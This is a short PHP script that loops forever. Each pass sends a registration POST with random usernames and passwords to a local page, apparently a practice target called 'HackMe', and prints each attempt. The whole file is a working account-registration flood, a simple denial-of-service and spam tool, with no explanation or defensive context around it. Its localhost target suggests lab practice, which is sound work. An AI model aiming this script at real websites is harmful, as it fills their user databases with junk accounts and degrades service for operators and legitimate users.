<?php

while(true){
	
	$ch = curl_init();

	$username = uniqid();
	$password = uniqid();
	
	curl_setopt($ch, CURLOPT_URL,"http://localhost/HackMe/index.php");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$username&name=$username&password=$password&register=register");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	
	echo "Sending - username: " . $username . " & password: " . $password . "\n";
	
	$a = curl_exec($ch);
	
	curl_close ($ch);
}
